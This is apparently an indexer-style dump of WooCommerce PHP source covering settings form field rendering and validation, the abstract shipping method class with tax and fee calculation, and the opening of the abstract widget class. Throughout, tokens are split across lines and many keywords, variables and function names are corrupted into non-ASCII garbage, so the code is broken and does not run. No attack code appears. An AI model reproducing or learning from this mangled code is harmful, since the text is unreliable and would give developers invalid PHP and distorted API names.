370 <
td
 
şass
="forminp">

371 <
f›ld£t
>

372 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></span></legend>

373 <
šput
 
şass
="wc_šput_decim® iÅut-‹xˆ»guÏr-špuˆ<?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>" 
ty³
="‹xt" 
Çme
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
id
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$d©a['css'] ); ?>" 
v®ue
="<?ph°echØesc_©ŒĞwc_fÜm©_loÿlized_decim®Ğ$this->g‘_İtiÚĞ$key ) ) ); ?>" 
¶aûhŞd”
="<?ph°echØesc_©ŒĞ$d©a['¶aûhŞd”'] ); ?>" <?
php
 
	`di§bËd
Ğ
$d©a
['di§bËd'], 
Œue
 ); ?> <?ph°
echo
 
$this
->
	`g‘_cu¡om_©Œibu‹_html
( $data ); ?> />

374 <?
php
 
echo
 
$this
->
	`g‘_desütiÚ_html
Ğ
$d©a
 ); ?>

375 </
f›ld£t
>

376 </
td
>

377 </
Œ
>

378 <?
php


379  
	`ob_g‘_ş—n
();

380 
	}
}

391 
public
 
funùiÚ
 
	$g’”©e_·sswÜd_html
Ğ
$key
, 
$d©a
 ) {

392 
$d©a
['type'] = 'password';

393  
$this
->
	`g’”©e_‹xt_html
Ğ
$key
, 
$d©a
 );

394 
	}
}

405 
public
 
funùiÚ
 
	$g’”©e_‹x»a_html
Ğ
$key
, 
$d©a
 ) {

406 
$f›ld
 = 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
;

407 
$deçuÉs
 = 
	`¬¿y
(

409 'di§bËd' => 
çl£
,

414 'desc_t' => 
çl£
,

416 'cu¡om_©Œibu‹s' => 
	`¬¿y
()

419 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

421 
	`ob_¡¬t
();

423 <
Œ
 
v®ign
="top">

424 <
th
 
scİe
="row" 
şass
="titledesc">

425 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$f›ld ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></label>

426 <?
php
 
echo
 
$this
->
	`g‘_toŞt_html
Ğ
$d©a
 ); ?>

427 </
th
>

428 <
td
 
şass
="forminp">

429 <
f›ld£t
>

430 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></span></legend>

431 <
‹x»a
 
rows
="3" 
cŞs
="20" 
şass
="šput-‹xˆwide-špuˆ<?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>" 
ty³
="<?ph°echØesc_©ŒĞ$d©a['ty³'] ); ?>" 
Çme
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
id
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$d©a['css'] ); ?>" 
¶aûhŞd”
="<?ph°echØesc_©ŒĞ$d©a['¶aûhŞd”'] ); ?>" <?
php
 
	`di§bËd
Ğ
$d©a
['di§bËd'], 
Œue
 ); ?> <?ph°
echo
 
$this
->
	`g‘_cu¡om_©Œibu‹_html
Ğ$d©¨); ?>><?ph°echØ
	`esc_‹x»a
Ğ$this->
	`g‘_İtiÚ
Ğ
$key
 ) ); ?></textarea>

432 <?
php
 
echo
 
$this
->
	`g‘_desütiÚ_html
Ğ
$d©a
 ); ?>

433 </
f›ld£t
>

434 </
td
>

435 </
Œ
>

436 <?
php


437  
	`ob_g‘_ş—n
();

438 
	}
}

449 
public
 
funùiÚ
 
	$g’”©e_checkbox_html
Ğ
$key
, 
$d©a
 ) {

450 
$f›ld
 = 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
;

451 
$deçuÉs
 = 
	`¬¿y
(

454 'di§bËd' => 
çl£
,

458 'desc_t' => 
çl£
,

460 'cu¡om_©Œibu‹s' => 
	`¬¿y
()

463 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

465 iàĞ! 
$d©a
['label'] )

466 
$d©a
['label'] = $data['title'];

468 
	`ob_¡¬t
();

470 <
Œ
 
v®ign
="top">

471 <
th
 
scİe
="row" 
şass
="titledesc">

472 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$f›ld ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></label>

473 <?
php
 
echo
 
$this
->
	`g‘_toŞt_html
Ğ
$d©a
 ); ?>

474 </
th
>

475 <
td
 
şass
="forminp">

476 <
f›ld£t
>

477 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></span></legend>

478 <
Ïb–
 ="<?phpƒchoƒsc_attr( $field ); ?>">

479 <
šput
 <?
php
 
	`di§bËd
Ğ
$d©a
['di§bËd'], 
Œue
 ); ?> 
şass
="<?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>" 
ty³
="checkbox" 
Çme
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
id
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$d©a['css'] ); ?>" 
v®ue
="1" <?ph°
	`checked
Ğ
$this
->
	`g‘_İtiÚ
Ğ
$key
 ), 'yes' ); ?> <?ph°
echo
 $this->
	`g‘_cu¡om_©Œibu‹_html
Ğ$d©¨); ?> /> <?ph°echØ
	`wp_k£s_po¡
Ğ$d©a['Ïb–'] ); ?></
Ïb–
><
br
/>

480 <?
php
 
echo
 
$this
->
	`g‘_desütiÚ_html
Ğ
$d©a
 ); ?>

481 </
f›ld£t
>

482 </
td
>

483 </
Œ
>

484 <?
php


485  
	`ob_g‘_ş—n
();

486 
	}
}

497 
public
 
funùiÚ
 
	$g’”©e_£Ëù_html
Ğ
$key
, 
$d©a
 ) {

498 
$f›ld
 = 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
;

499 
$deçuÉs
 = 
	`¬¿y
(

501 'di§bËd' => 
çl£
,

506 'desc_t' => 
çl£
,

508 'cu¡om_©Œibu‹s' => 
	`¬¿y
(),

509 'İtiÚs' => 
	`¬¿y
()

512 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

514 
	`ob_¡¬t
();

516 <
Œ
 
v®ign
="top">

517 <
th
 
scİe
="row" 
şass
="titledesc">

518 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$f›ld ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></label>

519 <?
php
 
echo
 
$this
->
	`g‘_toŞt_html
Ğ
$d©a
 ); ?>

520 </
th
>

521 <
td
 
şass
="forminp">

522 <
f›ld£t
>

523 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></span></legend>

524 <
£Ëù
 
şass
="£Ëù <?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>" 
Çme
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
id
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$d©a['css'] ); ?>" <?
php
 
	`di§bËd
Ğ
$d©a
['di§bËd'], 
Œue
 ); ?> <?ph°
echo
 
$this
->
	`g‘_cu¡om_©Œibu‹_html
( $data ); ?>>

525 <?
php
 
	`fÜ—ch
 ( (
¬¿y
è
$d©a
['İtiÚs'] 
as
 
$İtiÚ_key
 => 
$İtiÚ_v®ue
 ) : ?>

526 <
İtiÚ
 
v®ue
="<?ph°echØesc_©ŒĞ$İtiÚ_key ); ?>" <?
php
 
	`£Ëùed
Ğ
$İtiÚ_key
, 
	`esc_©Œ
Ğ
$this
->
	`g‘_İtiÚ
Ğ
$key
 ) ) ); ?>><?ph°
echo
ƒsc_©ŒĞ
$İtiÚ_v®ue
 ); ?></option>

527 <?
php
 
’dfÜ—ch
; ?>

528 </
£Ëù
>

529 <?
php
 
echo
 
$this
->
	`g‘_desütiÚ_html
Ğ
$d©a
 ); ?>

530 </
f›ld£t
>

531 </
td
>

532 </
Œ
>

533 <?
php


534  
	`ob_g‘_ş—n
();

535 
	}
}

546 
public
 
funùiÚ
 
	$g’”©e_muÉi£Ëù_html
Ğ
$key
, 
$d©a
 ) {

547 
$f›ld
 = 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
;

548 
$deçuÉs
 = 
	`¬¿y
(

550 'di§bËd' => 
çl£
,

555 'desc_t' => 
çl£
,

557 'cu¡om_©Œibu‹s' => 
	`¬¿y
(),

558 'İtiÚs' => 
	`¬¿y
()

561 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

563 
	`ob_¡¬t
();

565 <
Œ
 
v®ign
="top">

566 <
th
 
scİe
="row" 
şass
="titledesc">

567 <
Ïb–
 ="<?ph°echØesc_©ŒĞ$f›ld ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></label>

568 <?
php
 
echo
 
$this
->
	`g‘_toŞt_html
Ğ
$d©a
 ); ?>

569 </
th
>

570 <
td
 
şass
="forminp">

571 <
f›ld£t
>

572 <
Ëg’d
 
şass
="sü“n-»ad”-‹xt"><
¥ª
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></span></legend>

573 <
£Ëù
 
muÉË
="muÉË" 
şass
="muÉi£Ëù <?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>" 
Çme
="<?ph°echØesc_©ŒĞ$f›ld ); ?>[]" 
id
="<?ph°echØesc_©ŒĞ$f›ld ); ?>" 
¡yË
="<?ph°echØesc_©ŒĞ$d©a['css'] ); ?>" <?
php
 
	`di§bËd
Ğ
$d©a
['di§bËd'], 
Œue
 ); ?> <?ph°
echo
 
$this
->
	`g‘_cu¡om_©Œibu‹_html
( $data ); ?>>

574 <?
php
 
	`fÜ—ch
 ( (
¬¿y
è
$d©a
['İtiÚs'] 
as
 
$İtiÚ_key
 => 
$İtiÚ_v®ue
 ) : ?>

575 <
İtiÚ
 
v®ue
="<?ph°echØesc_©ŒĞ$İtiÚ_key ); ?>" <?
php
 
	`£Ëùed
Ğ
	`š_¬¿y
Ğ
$İtiÚ_key
, 
$this
->
	`g‘_İtiÚ
Ğ
$key
, 
	`¬¿y
(èè), 
Œue
 ); ?>><?ph°
echo
 
	`esc_©Œ
Ğ
$İtiÚ_v®ue
 ); ?></option>

576 <?
php
 
’dfÜ—ch
; ?>

577 </
£Ëù
>

578 <?
php
 
echo
 
$this
->
	`g‘_desütiÚ_html
Ğ
$d©a
 ); ?>

579 </
f›ld£t
>

580 </
td
>

581 </
Œ
>

582 <?
php


583  
	`ob_g‘_ş—n
();

584 
	}
}

595 
public
 
funùiÚ
 
	$g’”©e_t™Ë_html
Ğ
$key
, 
$d©a
 ) {

596 
$deçuÉs
 = 
	`¬¿y
(

602 
$d©a
 = 
	`wp_·r£_¬gs
Ğ$d©a, 
$deçuÉs
 );

604 
	`ob_¡¬t
();

606 </
bË
>

607 <
h4
 
şass
="<?ph°echØesc_©ŒĞ$d©a['şass'] ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['title'] ); ?></h4>

608 <?
php
 iàĞ! 
	`em±y
Ğ
$d©a
['description'] ) ) : ?>

609 <
p
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['description'] ); ?></p>

610 <?
php
 
’dif
; ?>

611 <
bË
 
şass
="form-table">

612 <?
php


613  
	`ob_g‘_ş—n
();

614 
	}
}

625 
public
 
funùiÚ
 
	$v®id©e_£‰šgs_f›lds
Ğ
$fÜm_f›lds
 = 
çl£
 ) {

626 iàĞ! 
$fÜm_f›lds
 )

627 
$fÜm_f›lds
 = 
$this
->
	`g‘_fÜm_f›lds
();

629 
$this
->
§n™ized_f›lds
 = 
	`¬¿y
();

631 
	`fÜ—ch
 ( 
$fÜm_f›lds
 
as
 
$k
 => 
$v
 ) {

632 iàĞ
	`em±y
Ğ
$v
['type'] ) )

633 
$v
['type'] = 'text';

636 iàĞ
	`m‘hod_exi¡s
Ğ
$this
, 'v®id©e_' . 
$k
 . '_field' ) ) {

637 
$f›ld
 = 
$this
->{'v®id©e_' . 
$k
 . '_field'}( $k );

638 
$this
->
§n™ized_f›lds
[ 
$k
 ] = 
$f›ld
;

641 } 
	`–£if
 ( 
	`m‘hod_exi¡s
Ğ
$this
, 'v®id©e_' . 
$v
['type'] . '_field' ) ) {

642 
$f›ld
 = 
$this
->{'v®id©e_' . 
$v
['ty³'] . '_f›ld'}Ğ
$k
 );

643 
$this
->
§n™ized_f›lds
[ 
$k
 ] = 
$f›ld
;

647 
$f›ld
 = 
$this
->{'v®id©e_‹xt_f›ld'}Ğ
$k
 );

648 
$this
->
§n™ized_f›lds
[ 
$k
 ] = 
$f›ld
;

651 
	}
}

663 
public
 
funùiÚ
 
	$v®id©e_checkbox_f›ld
Ğ
$key
 ) {

664 
$¡©us
 = 'no';

665 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) && ( 1 == $_POST[ $this->plugin_id . $this->id . '_' . $key ] ) ) {

666 
$¡©us
 = 'yes';

669  
$¡©us
;

670 
	}
}

678 
public
 
funùiÚ
 
	$v®id©e_‹xt_f›ld
Ğ
$key
 ) {

679 
$‹xt
 = 
$this
->
	`g‘_İtiÚ
Ğ
$key
 );

681 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) )

682 
$‹xt
 = 
	`wp_k£s_po¡
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) );

684  
$‹xt
;

685 
	}
}

693 
public
 
funùiÚ
 
	$v®id©e_´iû_f›ld
Ğ
$key
 ) {

694 
$‹xt
 = 
$this
->
	`g‘_İtiÚ
Ğ
$key
 );

696 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) {

697 iàĞ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] !== '' )

698 
$‹xt
 = 
	`wc_fÜm©_decim®
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) );

700 
$‹xt
 = '';

703  
$‹xt
;

704 
	}
}

712 
public
 
funùiÚ
 
	$v®id©e_decim®_f›ld
Ğ
$key
 ) {

713 
$‹xt
 = 
$this
->
	`g‘_İtiÚ
Ğ
$key
 );

715 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) {

716 iàĞ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] !== '' )

717 
$‹xt
 = 
	`wc_fÜm©_decim®
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) );

719 
$‹xt
 = '';

722  
$‹xt
;

723 
	}
}

735 
public
 
funùiÚ
 
	$v®id©e_·sswÜd_f›ld
Ğ
$key
 ) {

736 
$‹xt
 = 
$this
->
	`g‘_İtiÚ
Ğ
$key
 );

738 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) {

739 
$‹xt
 = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) );

742  
$‹xt
;

743 
	}
}

755 
public
 
funùiÚ
 
	$v®id©e_‹x»a_f›ld
Ğ
$key
 ) {

756 
$‹xt
 = 
$this
->
	`g‘_İtiÚ
Ğ
$key
 );

758 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) {

759 
$‹xt
 = 
	`wp_k£s
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ),

760 
	`¬¿y_m”ge
(

761 
	`¬¿y
(

762 'iäame' => 
	`¬¿y
Ğ'¤c' => 
Œue
, 'style' =>rue, 'id' =>rue, 'class' =>rue )

764 
	`wp_k£s_®lowed_html
( 'post' )

769  
$‹xt
;

770 
	}
}

782 
public
 
funùiÚ
 
	$v®id©e_£Ëù_f›ld
Ğ
$key
 ) {

783 
$v®ue
 = 
$this
->
	`g‘_İtiÚ
Ğ
$key
 );

785 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) {

786 
$v®ue
 = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) );

789  
$v®ue
;

790 
	}
}

802 
public
 
funùiÚ
 
	$v®id©e_muÉi£Ëù_f›ld
Ğ
$key
 ) {

803 
$v®ue
 = 
$this
->
	`g‘_İtiÚ
Ğ
$key
 );

805 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) ) {

806 
$v®ue
 = 
	`¬¿y_m­
Ğ'wc_ş—n',‡¼ay_m­Ğ'¡r¦ashes', (
¬¿y
è
$_POST
[ 
$this
->
¶ugš_id
 . $this->
id
 . '_' . 
$key
 ] ) );

808 
$v®ue
 = '';

811  
$v®ue
;

812 
	}
}

	@includes/abstracts/abstract-wc-shipping-method.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 
ab¡¿ù
 cÏs 
	cWC_Shpšg_M‘hod
 
ex‹nds
 
	mWC_S‘tšgs_API
 {

19 
v¬
 
	m$id
;

22 
v¬
 
	m$numb”
;

25 
v¬
 
	m$m‘hod_t™Ë
;

28 
v¬
 
	m$t™Ë
;

31 
v¬
 
	m$avaab™y
;

34 
v¬
 
	m$couÁr›s
 = 
¬¿y
();

37 
v¬
 
	m$x_¡©us
 = 'taxable';

40 
v¬
 
	m$ãe
 = 0;

43 
v¬
 
	m$mšimum_ãe
 = 
nuÎ
;

46 
v¬
 
	m$’abËd
 = 
çl£
;

49 
v¬
 
	m$has_£‰šgs
 = 
Œue
;

52 
v¬
 
	m$suµÜts
 = 
¬¿y
();

55 
v¬
 
	m$¿‹s
 = 
¬¿y
();

61 
public
 
funùiÚ
 
	$is_xabË
() {

62  ( 
	`g‘_İtiÚ
Ğ'woocomm”û_ÿlc_xes' ) =ğ'yes' && 
$this
->
x_¡©us
 =ğ'xabË' && ! 
	`WC
()->
cu¡om”
->
	`is_v©_exem±
() );

74 
funùiÚ
 
	`add_¿‹
Ğ
$¬gs
 = 
	$¬¿y
() ) {

76 
$deçuÉs
 = 
	`¬¿y
(

84 
$¬gs
 = 
	`wp_·r£_¬gs
Ğ$¬gs, 
$deçuÉs
 );

86 
	`exŒaù
Ğ
$¬gs
 );

89 iàĞ! 
$id
 || ! 
$Ïb–
 ) ;

92 
$tÙ®_co¡
 = ( 
	`is_¬¿y
Ğ
$co¡
 ) ) ? 
	`¬¿y_sum
( $cost ) : $cost;

96 iàĞ! 
	`is_¬¿y
Ğ
$xes
 ) && $xe !=ğ
çl£
 && 
$tÙ®_co¡
 > 0 && 
$this
->
	`is_xabË
() ) {

98 
$_x
 = 
Ãw
 
	`WC_Tax
();

99 
$xes
 = 
	`¬¿y
();

101  
$ÿlc_x
 ) {

106 iàĞ
	`is_¬¿y
Ğ
$co¡
 ) ) {

108 
$ÿ¹
 = 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
();

110 
	`fÜ—ch
 ( 
$co¡
 
as
 
$co¡_key
 => 
$amouÁ
 ) {

112 iàĞ! 
	`is£t
Ğ
$ÿ¹
[ 
$co¡_key
 ] ) )

115 
$_´oduù
 = 
$ÿ¹
[ 
$co¡_key
 ]['data'];

117 
$¿‹s
 = 
$_x
->
	`g‘_shpšg_x_¿‹s
Ğ
$_´oduù
->
	`g‘_x_şass
() );

118 
$™em_xes
 = 
$_x
->
	`ÿlc_shpšg_x
Ğ
$amouÁ
, 
$¿‹s
 );

121 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$xes
 + 
$™em_xes
 ) 
as
 
$key
 )

122 
$xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$™em_xes
[ $key ] ) ? $item_taxes[ $key ] : 0 ) + ( isset( $taxes[ $key ] ) ? $taxes[ $key ] : 0 );

127 iàĞ
	`is£t
Ğ
$co¡
['order'] ) ) {

129 
$¿‹s
 = 
$_x
->
	`g‘_shpšg_x_¿‹s
();

130 
$™em_xes
 = 
$_x
->
	`ÿlc_shpšg_x
Ğ
$co¡
['Üd”'], 
$¿‹s
 );

133 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$xes
 + 
$™em_xes
 ) 
as
 
$key
 )

134 
$xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$™em_xes
[ $key ] ) ? $item_taxes[ $key ] : 0 ) + ( isset( $taxes[ $key ] ) ? $taxes[ $key ] : 0 );

143 
$¿‹s
 = 
$_x
->
	`g‘_shpšg_x_¿‹s
();

144 
$xes
 = 
$_x
->
	`ÿlc_shpšg_x
Ğ
$tÙ®_co¡
, 
$¿‹s
 );

152 
$this
->
¿‹s
[] = 
Ãw
 
	`WC_Shpšg_R©e
Ğ
$id
, 
$Ïb–
, 
$tÙ®_co¡
, 
$xes
, $this->
id
 );

153 
	}
}

161 
funùiÚ
 
	$has_£‰šgs
() {

162  ( 
$this
->
has_£‰šgs
 );

163 
	}
}

171 
public
 
funùiÚ
 
	$is_avaabË
Ğ
$·ckage
 ) {

172 iàĞ"no" =ğ
$this
->
’abËd
 ) {

173  
çl£
;

177  
$this
->
avaab™y
 ) {

180 
$sh_to_couÁr›s
 = 
	`¬¿y_š‹r£ù
Ğ
$this
->
couÁr›s
, 
	`¬¿y_keys
Ğ
	`WC
()->couÁr›s->
	`g‘_shpšg_couÁr›s
() ) );

183 
$sh_to_couÁr›s
 = 
	`¬¿y_diff
Ğ
$this
->
couÁr›s
, 
	`¬¿y_keys
Ğ
	`WC
()->couÁr›s->
	`g‘_shpšg_couÁr›s
() ) );

186 
$sh_to_couÁr›s
 = 
	`¬¿y_keys
Ğ
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
() );

190 iàĞ! 
	`š_¬¿y
Ğ
$·ckage
['de¡š©iÚ']['couÁry'], 
$sh_to_couÁr›s
 ) ) {

191  
çl£
;

194  
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_' . 
$this
->
id
 . '_is_avaabË', 
Œue
, 
$·ckage
 );

195 
	}
}

202 
public
 
funùiÚ
 
	$g‘_t™Ë
() {

203  
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_m‘hod_t™Ë', 
$this
->
t™Ë
, $this->
id
 );

204 
	}
}

214 
funùiÚ
 
	$g‘_ãe
Ğ
$ãe
, 
$tÙ®
 ) {

215 iàĞ
	`¡r¡r
Ğ
$ãe
, '%' ) ) :

216 
$ãe
 = ( 
$tÙ®
 / 100 ) * 
	`¡r_»¶aû
( '%', '', $fee );

217 
’dif
;

218 iàĞ! 
	`em±y
Ğ
$this
->
mšimum_ãe
 ) && $this->mšimum_ã> 
$ãe
 ) $fee = $this->minimum_fee;

219  
$ãe
;

220 
	}
}

231 
funùiÚ
 
	$suµÜts
Ğ
$ã©u»
 ) {

232  
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_m‘hod_suµÜts', 
	`š_¬¿y
Ğ
$ã©u»
, 
$this
->
suµÜts
 ) ? 
Œue
 : 
çl£
, $feature, $this );

233 
	}
}

	@includes/abstracts/abstract-wc-widget.php

1 <?
php


11 
ab¡¿ù
 cÏs 
	cWC_Widg‘
 
ex‹nds
 
	mWP_Widg‘
 {

13 
public
 
	m$widg‘_cssşass
;

14 
public
 
	m$widg‘_desütiÚ
;

15 
public
 
	m$widg‘_id
;

16 
public
 
	m$widg‘_Çme
;

17 
public
 
	m$£‰šgs
;

22 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

23 
$widg‘_İs
 = 
	`¬¿y
(

24 'şas¢ame' => 
$this
->
widg‘_cssşass
,

25 'desütiÚ' => 
$this
->
widg‘_desütiÚ


28 
$this
->
	`WP_Widg‘
Ğ$this->
widg‘_id
, $this->
widg‘_Çme
, 
$widg‘_İs
 );

30 
	`add_aùiÚ
Ğ'§ve_po¡', 
	`¬¿y
Ğ
$this
, 'flush_widget_cache' ) );

31 
	`add_aùiÚ
Ğ'd–‘ed_po¡', 
	`¬¿y
Ğ
$this
, 'flush_widget_cache' ) );

32 
	`add_aùiÚ
Ğ'sw™ch_theme', 
	`¬¿y
Ğ
$this
, 'flush_widget_cache' ) );

38 
funùiÚ
 
	$g‘_ÿched_widg‘
Ğ
$¬gs
 ) {

39 
$ÿche
 = 
	`wp_ÿche_g‘
Ğ
$this
->
widg‘_id
, 'widget' );

41 iàĞ! 
	`is_¬¿y
Ğ
$ÿche
 ) )

42 
$ÿche
 = 
	`¬¿y
();

44 iàĞ
	`is£t
Ğ
$ÿche
[ 
$¬gs
['widget_id'] ] ) ) {

45 
echo
 
$ÿche
[ 
$¬gs
['widget_id'] ];

46  
Œue
;

49  
çl£
;

50 
	}
}

55 
public
 
funùiÚ
 
	$ÿche_widg‘
Ğ
$¬gs
, 
$cÚ‹Á
 ) {

56 
$ÿche
[ 
$¬gs
['widg‘_id'] ] = 
$cÚ‹Á
;

58 
	`wp_ÿche_£t
Ğ
$this
->
widg‘_id
, 
$ÿche
, 'widget' );

59 
	}
}

65 
public
 
funùiÚ
 
	$æush_widg‘_ÿche
() {

66 
	`wp_ÿche_d–‘e
Ğ
$this
->
widg‘_id
, 'widget' );

67 
	}
}

78 
funùiÚ
 
	$upd©e
Ğ
$Ãw_š¡ªû
, 
$Şd_š¡ªû
 ) {

79 
$š¡ªû
 = 
$Şd_š¡ªû
;

81 iàĞ! 
$this
->
£‰šgs
 )

82  
$š¡ªû
;

84 
	`fÜ—ch
 ( 
$this
->
£‰šgs
 
as
 
$key
 => 
$£‰šg
 ) {

85 iàĞ
	`is£t
Ğ
$Ãw_š¡ªû
[ 
$key
 ] ) ) {

86 
$š¡ªû
[ 
$key
 ] = 
	`§n™ize_‹xt_f›ld
Ğ
$Ãw_š¡ªû
[ $key ] );

87 } 
	`–£if
 ( 'checkbox' ==ğ
$£‰šg
['type'] ) {

88 
$š¡ªû
[ 
$key
 ] = 0;

92 
$this
->
	`æush_widg‘_ÿche
();

94  
$š¡ªû
;

95 
	}
}

105 
funùiÚ
 
	$fÜm
Ğ
$š¡ªû
 ) {

107 iàĞ! 
$this
->
£‰šgs
 )

110 
	`fÜ—ch
 ( 
$this
->
£‰šgs
 
as
 
$key
 => 
$£‰šg
 ) {

112 
$v®ue
 = 
	`is£t
Ğ
$š¡ªû
[ 
$key
 ] ) ? $š¡ªû[ $key ] : 
$£‰šg
['std'];

114  
$£‰šg
['type'] ) {

117 <
p
>

118 <
Ïb–
 ="<?ph°echØ$this->g‘_f›ld_idĞ$key ); ?>"><?
php
 
echo
 
$£‰šg
['label']; ?></label>

119 <
šput
 
şass
="wideçt" 
id
="<?ph°echØesc_©ŒĞ$this->g‘_f›ld_idĞ$key ) ); ?>" 
Çme
="<?ph°echØ$this->g‘_f›ld_ÇmeĞ$key ); ?>" 
ty³
="‹xt" 
v®ue
="<?phpƒchoƒsc_attr( $value ); ?>" />

120 </
p
>

121 <?
php


125 <
p
>

126 <
Ïb–
 ="<?ph°echØ$this->g‘_f›ld_idĞ$key ); ?>"><?
php
 
echo
 
$£‰šg
['label']; ?></label>

127 <
šput
 
şass
="wideçt" 
id
="<?ph°echØesc_©ŒĞ$this->g‘_f›ld_idĞ$key ) ); ?>" 
Çme
="<?ph°echØ$this->g‘_f›ld_ÇmeĞ$key ); ?>" 
ty³
="numb”" 
¡•
="<?ph°echØesc_©ŒĞ$£‰šg['¡•'] ); ?>" 
mš
="<?ph°echØesc_©ŒĞ$£‰šg['mš'] ); ?>" 
max
="<?ph°echØesc_©ŒĞ$£‰šg['max'] ); ?>" 
v®ue
="<?phpƒchoƒsc_attr( $value ); ?>" />

128 </
p
>

129 <?
php


133 <
p
>

134 <
Ïb–
 ="<?ph°echØ$this->g‘_f›ld_idĞ$key ); ?>"><?
php
 
echo
 
$£‰šg
['label']; ?></label>

135 <
£Ëù
 
şass
="wideçt" 
id
="<?ph°echØesc_©ŒĞ$this->g‘_f›ld_idĞ$key ) ); ?>" 
Çme
="<?phpƒcho $this->get_field_name( $key ); ?>">

136 <?
php
 
	`fÜ—ch
 ( 
$£‰šg
['İtiÚs'] 
as
 
$İtiÚ_key
 => 
$İtiÚ_v®ue
 ) : ?>

137 <
İtiÚ
 
v®ue
="<?ph°echØesc_©ŒĞ$İtiÚ_key ); ?>" <?
php
 
	`£Ëùed
Ğ
$İtiÚ_key
, 
$v®ue
 ); ?>><?ph°
echo
 
	`esc_html
Ğ
$İtiÚ_v®ue
 ); ?></option>

